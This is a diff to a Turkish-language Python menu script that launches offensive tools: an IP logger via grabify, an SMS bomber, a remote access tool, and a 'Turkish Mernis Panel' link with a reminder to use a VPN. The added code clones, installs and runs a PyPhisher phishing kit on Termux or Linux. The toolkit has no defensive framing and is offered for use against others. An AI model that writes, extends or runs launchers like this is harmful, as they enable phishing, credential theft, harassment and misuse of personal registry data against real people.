@@ -13,6 +13,7 @@ clear = lambda: os.system("cls")
 sms_klasor = "erenbomb"
 rat_klasor = "empyrean"
 ipsorgu_klasor = "ipsorgu"
+phishing_klasor = "PyPhisher"
 
 # KOD
 print(Fore.LIGHTBLUE_EX + """
@@ -26,11 +27,14 @@ print(Fore.LIGHTBLUE_EX + """
 {}[{}1{}] {}İp Logger
 {}[{}2{}] {}Sms Bomber
 {}[{}3{}] {}Remote Acces Tool (Rat)
-{}[{}4{}] {}İp Sorgu (BAKIMDA {}#KODLANMA AŞAMASINDA)
+{}[{}4{}] {}İp Sorgu {}# BAKIMDA #KODLANMA AŞAMASINDA
+{}[{}5{}] {}Turkish Mernis Panel
+{}[{}6{}] {}Phishing Sitesi {}# TERMUX / LINUX
                                                                                   
 {}
-""".format(Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.RESET))
+""".format(Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.RESET))
 anamenu_soru = input("{}Hangi Toola Giriş Yapmak İstersiniz: {}".format(Fore.BLUE, Fore.RESET))
+#
 if anamenu_soru == ("1"):
     clear()
     os.system("start https://grabify.link")
@@ -128,3 +132,39 @@ if anamenu_soru == ("4"):
         print(Fore.LIGHTRED_EX + "Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
         time.sleep(3)
         os.system("py tools.py")
+if anamenu_soru == ("5"):
+    clear()
+    print(Fore.BLUE + "Panel Sitesine Yönlendiriliyorsunuz #VPN AÇMAYI UNUTMAYIN!")
+    time.sleep(5)    
+    os.system("start https://nopanel.run")
+    os.system("py tools.py")
+if anamenu_soru == ("6"):
+    clear()
+    termux_linux = input("{}Hangi sistemi kullanıyorsun ? {}termux{}/{}linux{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
+
+    if termux_linux == ("termux"):
+        phishing = input("{}Önceden PyPhisher kurdun mu ? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
+        if phishing == ("n"):
+            clear()
+            os.system("git clone https://github.com/vHzEren/PyPhisher.git")
+            os.chdir(phishing_klasor)
+            os.system("pkg install git python3 php openssh -y")
+            os.system("pip3 install -r files/requirements.txt")
+            os.system("pip3 install pyphisher")
+            os.system("python3 pyphisher.py")
+        if phishing == ("y"):
+            os.chdir(phishing_klasor)
+            os.system("python3 pyphisher.py")
+
+    if termux_linux == ("linux"):
+        phishing = input("{}Önceden PyPhisher kurdun mu ? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
+        if phishing == ("n"):            
+            clear()
+            os.system("git clone https://github.com/vHzEren/PyPhisher.git")
+            os.chdir(phishing_klasor)
+            os.system("pip3 install -r files/requirements.txt")
+            os.system("sudo pip3 install pyphisher")
+            os.system("python3 pyphisher.py")
+        if phishing == ("y"):
+            os.chdir(phishing_klasor)
+            os.system("python3 pyphisher.py")
